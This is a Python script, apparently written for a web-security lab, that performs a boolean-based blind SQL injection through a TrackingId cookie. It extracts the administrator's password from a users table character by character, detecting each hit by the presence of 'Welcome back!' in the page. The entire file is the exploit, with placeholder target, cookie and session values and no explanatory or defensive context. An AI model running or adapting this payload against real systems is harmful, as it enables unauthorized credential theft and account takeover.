import requests
from bs4 import BeautifulSoup
import time


url = 'https://example.com'

headers = {
    'Host': 'example.com',
    'User-Agent': 'TUO USER AGENT',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Priority': 'u=0, i',
    'Te': 'trailers',
    'Connection': 'keep-alive'
}        


def find_letter(url,headers):
    start_time = time.time()
    password = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9']
    result = []
    param = 1
    while param < 21:
        for value in password:
            cookie_value = f"COOKIEDASOSTITUIRE' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {param}, 1) = '{value}; session=SESSIONDASOSTITUIRE -- "
            cookies = {'TrackingId': cookie_value}
            cookies
            print(cookies)
            response = requests.get(url, headers=headers, cookies=cookies)
            soup = BeautifulSoup(response.text, 'html.parser')
            welcome_message = soup.find(string ="Welcome back!")
            if welcome_message:
                result.append(value)
                param += 1
                print(result)
    end_time = time.time()
    execution_time = end_time - start_time 
    print(f"\n[!] Tempo di esecuzione: {execution_time:.4f} secondi")
    return result

        


find_letter(url,headers)

